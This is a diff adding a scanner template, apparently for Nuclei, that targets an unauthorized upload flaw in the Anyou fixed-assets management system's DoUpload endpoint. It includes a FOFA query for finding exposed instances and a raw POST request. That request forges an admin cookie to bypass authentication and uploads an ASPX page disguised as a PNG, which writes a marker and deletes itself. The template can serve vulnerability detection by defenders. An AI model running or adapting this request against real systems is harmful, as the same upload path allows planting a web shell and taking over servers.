@@ -1,0 +1,33 @@
+id: anyou-fixed-assets-management-system-doupload-unauthorized-access
+info:
+  name: 安友固定资产管理系统 DoUpload 接口未授权访问漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/style/v2/layuiadmin/style/admin.css"
+    安友固定资产管理系统 DoUpload 接口存在身份验证逻辑缺陷，导致攻击者可通过构造恶意请求绕过认证机制，从而在未授权状态下直接访问受限功能模块。
+  tags: 安友固定资产管理系统
+  
+http:
+- raw:
+  - |
+    POST /manage/Attachment/DoUpload?bocode=1 HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+    Content-Disposition: form-data; name="file"; filename="NTest.aspx"
+    Content-Type: image/png
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - ServerFileName
